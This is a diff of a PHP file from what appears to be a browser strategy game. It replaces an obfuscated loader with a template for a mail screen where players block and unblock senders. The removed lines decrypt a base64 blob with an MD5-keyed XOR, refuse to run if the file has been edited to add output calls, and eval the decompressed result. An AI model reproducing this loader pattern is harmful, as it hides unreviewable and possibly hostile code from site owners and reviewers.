@@ -1,24 +1,132 @@
-<?php
-$xrmovuja="a46c535aaf2ca8ad19682eb5f7d03164";
-$gcbyfxvahcp="0003030700015457515f5151075e50530758000f5400520553515d5657530e07";
-$qfssfgiiln="Ge3gPWhcunAgR0ziXSoo9iJgZfnpDuSiHKew86DnUyTX5BdsOVAkmPSUKhwlSNyfc7/s0FiRnTjlZc1kiRdKspc/6IEbF59sguplGgcm1cn6rfhLXZbdSvpDboacSnEfTHfxUygoU3JyJQjxKVkwydoYuRcHFi+7NJe14oLmCnXiCQnYKo94tnNEecWHbPRq5W2GfJZwwv18KpYlB8I1xCch7RJiff0u0wmKO0PbuHirKg32x+7T9FPiwD5TAgzvusUrFYB4kB7CG5qI02P+Zt6bLoX/PlmoyGRLfsUDGjTwHkEtp1K32+j2pdXJEuicaXmGhmfALtID00PMFZsxpWQq2nb6P5l3GigstRdZUcEUoMeWbXPnKgdlM8RjmypB0h0zbYSIlTcvZ/GfMN3ejfbJahoQpBc5HunQ3ncRwAmkxok/2yLuQEhFVQxb4fJQ8UaRVF5ZDg/8I+BP01i5nZnW/1N+38Qw9O6X/5i3usYvFXGsRps8XYbI1TMjLq04vhvOAiYqaEbngUv9VGDUWNoZIsPbTyKfPdgPQUi2Ssssp0Zdvlt7jAWBrjbe6jQvmVz0x2ZPSE3F3/lNpw2guh0FPp/V0vHXqJo3tTh7lCWpF9inQhAsrBFaZ1sKjy4EFp8iMsck0anQjwsZolA3zCJmwj2lUZbxqEVHVlp4p7yA3tytYqcxSctFrwPGpPrmDOPL1OUP6HXOS7qdm2ySuaYtVPGaXZIb/dqWPtUjrZO59ufdzusnaY5DmlChrsnFHIglXNi+Ztr5AC/gOBs2Ge1x7bPSQkpyIQYR3txD6qDV50pQS0hvaa4lfRl1NQnWmdwa4xPAtbknSSrPMSOb4xxFT1QLt6YZ+2+h856KeCZ2JNYfwoE4KRhVxQHCa7eALUm5y3TKbajiAWPhqu0+OPEzXjQCcRgWAYBogwzq5nMjSlvR8aANARlOfPEgWP+7pyrkk2m+MgskFGR0qpBC5TXTxz4d2YBAlSdRKJOHz7BioyZozQ+op/SLm6BMNZAHvezsvSzy9WFaCkLtBdjdcK/wuy3UuFB3C/zKeeVAo2JaeHMmYgZNoJuEyjrmqmyhAILVTNppv569iZp/0uayvZun5IEHBMV0e9G4Os7tnHvI56SVsK11XU00uU7NHqZlLy40AitHTBuSMDjWYfEV9cBfekqqxgNz6bE21CQH4+6F1jr295ROvewaAqZUBsK/vXN/dWUEt5XQPXNlSr/5LZSOxkmY4+Jz7ywlVYi12w5lxA2jVI/gEMdX+vZ20cBeB1FchBe0LV+sbbESKJ9wG6nOijexSrQj227Fakty2+RIvoQ/QOhF0+g29uX0EiMnWAplIYFuOFe3TMebv82H8Gw3onYg0oVxIdk4MBIDKRn/PjU24qwswj3woDAqioYNWNQQXCrhpcB61dOvxgPiXGPahX+vc4CoMSsjTWHTaA8qQpT/ojB/jRyQNPnQNPLchauclUd2b2alN7bD9vj1GCjzcsO7BVO6jJDycFBXv7j3W4RjmbrC+CdXpaBck2L6Jx6HDye9M4YPrecm+TO1k869r6ty+iV0kJ6VLz64SIpnzxGfWugTHRCgxOJAKEBsloSzvVQeGoBIdf24skpW/axTc3JG2F27s2lh3u7lgXvlXzwMnTK4aJC8jDBJ02/mdLL2s/ZG/7ZFwGXkdtSGWV++LyCgp7XiuH+ozfDXFGBW+rNF6QWbEzkyjCTXRQN3Q3h93trzUtRNNi9oTDvcu2cqmN4pJtq7Wcq9Rly79Aw1zHNlxVHS4FB0F3a85eNqETK4THZdXC2JGd0DCNSVRqjmp4zajYpBH2QWoLe5KlFzeZzG6ymlo1Nsb2yP8x2ge7VgrDTFqOkXXgadallUrjTTRZNt0kYnRjGRL2mjeEBftaSIpg1k7yIPQX+WP5zlxSxzT6V4W4Hgk7OeahxSN8/oN5pz2xRyVA8fAbqaDh0K+iXu4KRnPdFkvt9j26bHii5O6c4iLQHIBGSJbYnvR4HqKDhGnNtqbVU0KEfhgY4O5ZrrDxLrHhiBfhMz0eY928693V8BTL8SNH6tXvGnIVX38CtaUayiDY7T6wwyhcWTrVpQ4b8UNsbHvh2rZmKVvCaRYnYlWzDVUETU+pIqmyv9lTqvGFLjPHfm5E4FCb/u3Ye5U+uk9Vaex7srz84Frvz7mfilQheFEsZs+zdqI+IPVEEREtsHBIPqJPHVlH9MQpYIZHo7FhAWE+RuLNml38G71lO4gyViR9agcgZ0AbLNHE53g4IzjC8QvFSVqcZ3vXlc2majZiAfZ70ROv0YaLxcXC6Mnsf/hp3K36vCO+1frFc5pHD9tPPGo3bGI9g0wSIxqR8eyTG4kaDu";
-$xifhwzejlb=file_get_contents(__FILE__);
-$metxnig=str_replace($qfssfgiiln,"",$xifhwzejlb);
-if(strpos($metxnig,"ec"."ho")!==false||strpos($metxnig,"pr"."int")!==false||strpos($metxnig,"var_"."dump")!==false||strpos($metxnig,"file_put_"."contents")!==false||strpos($metxnig,"fw"."rite")!==false){die();}
-$iiqifdmfj=str_replace(array($xrmovuja,$gcbyfxvahcp),array("SP_8523c887","KP_5d8901b5"),$xifhwzejlb);
-$gmmiwzmz=md5($iiqifdmfj);
-$limxcxa=hex2bin($gcbyfxvahcp);
-$ecchnjkj="";
-$fdovvwry=strlen($gmmiwzmz);
-for($awkunc=0;$awkunc<$fdovvwry;$awkunc++){
-$ecchnjkj.=chr(ord($limxcxa[$awkunc])^ord($gmmiwzmz[$awkunc]));
-}
-$zeyzcj=base64_decode($qfssfgiiln);
-$znfdwyqhm=strlen($zeyzcj);
-$ofkerdl="";
-$opnfhfuu=strlen($ecchnjkj);
-for($awkunc=0;$awkunc<$znfdwyqhm;$awkunc++){
-$ofkerdl.=$zeyzcj[$awkunc]^$ecchnjkj[$awkunc%$opnfhfuu];
-}
-$hyzpzfpj="gzun"."compress";
-eval('?>' . $hyzpzfpj($ofkerdl) . '<?php ');
+<div class="mail-container">
+    <h3 style="margin-bottom: 20px; color: var(--medieval-brown);"><?= __('screens.mail.block_senders_title') ?></h3>
+
+    <?php
+    // Handle block/unblock actions
+    if (isset($_GET['action']) && isset($_GET['id']) && isset($_GET['h']) && $_GET['h'] == $hkey) {
+        $targetUserId = (int) $_GET['id'];
+
+        if ($_GET['action'] == 'block_id') {
+            // Add to blocked list
+            $db->query(
+                "INSERT IGNORE INTO blocked_users (user_id, blocked_user_id, blocked_at) VALUES (?, ?, ?)",
+                [$user['id'], $targetUserId, time()]
+            );
+            echo '<div class="mail-view-btn" style="background: var(--medieval-green); color: white; margin-bottom: 15px; text-align: center;">' . __('screens.mail.sender_blocked_success') . '</div>';
+        } elseif ($_GET['action'] == 'unblock') {
+            // Remove from blocked list
+            $db->query(
+                "DELETE FROM blocked_users WHERE user_id = ? AND blocked_user_id = ?",
+                [$user['id'], $targetUserId]
+            );
+            echo '<div class="mail-view-btn" style="background: var(--medieval-green); color: white; margin-bottom: 15px; text-align: center;">' . __('screens.mail.sender_unblocked_success') . '</div>';
+        }
+    }
+
+    // Get blocked users list
+    $blockedUsers = $db->fetchAll(
+        "SELECT bu.blocked_user_id, bu.blocked_at, u.username 
+         FROM blocked_users bu
+         LEFT JOIN users u ON u.id = bu.blocked_user_id
+         WHERE bu.user_id = ?
+         ORDER BY bu.blocked_at DESC",
+        [$user['id']]
+    );
+    ?>
+
+    <!-- Block New User Form -->
+    <div
+        style="background: white; border: 1px solid var(--border-ornate); border-radius: 4px; padding: 20px; margin-bottom: 20px;">
+        <h4 style="margin-top: 0; color: var(--medieval-brown);"><?= __('screens.mail.block_new_sender') ?></h4>
+        <p style="color: #666; font-size: 13px;"><?= __('screens.mail.enter_player_name_to_block') ?></p>
+
+        <form action="game.php?village=<?= $village['id'] ?>&screen=mail&mode=block&action=block_name&h=<?= $hkey ?>"
+            method="post" style="display: flex; gap: 10px; align-items: center;">
+            <input type="text" name="username" placeholder="<?= __('screens.mail.player_name_placeholder') ?>"
+                class="autocomplete ui-autocomplete-input" data-type="player"
+                style="flex: 1; padding: 8px; border: 1px solid var(--border-ornate); border-radius: 3px;" required>
+            <button type="submit" class="mail-view-btn danger">🚫 <?= __('screens.mail.block_button') ?></button>
+        </form>
+
+        <?php
+        // Handle block by username
+        if (isset($_POST['username']) && isset($_GET['action']) && $_GET['action'] == 'block_name') {
+            $username = trim($_POST['username']);
+            $targetUser = $db->fetch("SELECT id FROM users WHERE username = ?", [$username]);
+
+            if ($targetUser) {
+                $db->query(
+                    "INSERT IGNORE INTO blocked_users (user_id, blocked_user_id, blocked_at) VALUES (?, ?, ?)",
+                    [$user['id'], $targetUser['id'], time()]
+                );
+                echo '<div class="mail-view-btn" style="background: var(--medieval-green); color: white; margin-top: 15px; text-align: center;">' . __('screens.mail.sender_blocked_success') . '</div>';
+                // Refresh blocked users list
+                $blockedUsers = $db->fetchAll(
+                    "SELECT bu.blocked_user_id, bu.blocked_at, u.username 
+                     FROM blocked_users bu
+                     LEFT JOIN users u ON u.id = bu.blocked_user_id
+                     WHERE bu.user_id = ?
+                     ORDER BY bu.blocked_at DESC",
+                    [$user['id']]
+                );
+            } else {
+                echo '<div class="mail-view-btn danger" style="margin-top: 15px; text-align: center;">' . __('screens.mail.player_not_found') . '</div>';
+            }
+        }
+        ?>
+    </div>
+
+    <!-- Blocked Users List -->
+    <div style="background: white; border: 1px solid var(--border-ornate); border-radius: 4px; padding: 20px;">
+        <h4 style="margin-top: 0; color: var(--medieval-brown);">
+            <?= __('screens.mail.blocked_senders_count', ['count' => count($blockedUsers)]) ?>
+        </h4>
+
+        <?php if (count($blockedUsers) > 0): ?>
+            <div class="mail-list">
+                <?php foreach ($blockedUsers as $blocked): ?>
+                    <div class="mail-card" style="background: #fff9e6;">
+                        <div class="mail-icon" style="font-size: 24px;">🚫</div>
+
+                        <div class="mail-content">
+                            <div class="mail-header">
+                                <a href="game.php?village=<?= $village['id'] ?>&screen=info_player&id=<?= $blocked['blocked_user_id'] ?>"
+                                    class="mail-subject">
+                                    <?= htmlspecialchars($blocked['username'] ?? __('screens.mail.unknown_player')) ?>
+                                </a>
+                            </div>
+
+                            <div class="mail-meta">
+                                <span class="mail-date">
+                                    <?= __('screens.mail.blocked_on') ?>         <?= date('d.m.Y H:i', $blocked['blocked_at']) ?>
+                                </span>
+                            </div>
+                        </div>
+
+                        <div class="mail-actions" style="opacity: 1;">
+                            <a href="game.php?village=<?= $village['id'] ?>&screen=mail&mode=block&action=unblock&id=<?= $blocked['blocked_user_id'] ?>&h=<?= $hkey ?>"
+                                class="mail-view-btn" onclick="return confirm('<?= __('screens.mail.confirm_unblock') ?>')">
+                                ✓ <?= __('screens.mail.unblock_button') ?>
+                            </a>
+                        </div>
+                    </div>
+                <?php endforeach; ?>
+            </div>
+        <?php else: ?>
+            <div class="mail-empty">
+                <div class="mail-empty-icon">✅</div>
+                <div class="mail-empty-text"><?= __('screens.mail.no_blocked_senders') ?></div>
+                <p style="color: #999; font-size: 13px; margin-top: 10px;">
+                    <?= __('screens.mail.no_blocked_senders_info') ?>
+                </p>
+            </div>
+        <?php endif; ?>
+    </div>
+
+    <div
+        style="margin-top: 20px; padding: 15px; background: var(--parchment-light); border: 1px solid var(--border-ornate); border-radius: 4px;">
+        <p style="margin: 0; color: #666; font-size: 13px;">
+            <strong>ℹ️ <?= __('screens.mail.note_label') ?></strong> <?= __('screens.mail.block_sender_note') ?>
+        </p>
+    </div>
+</div>
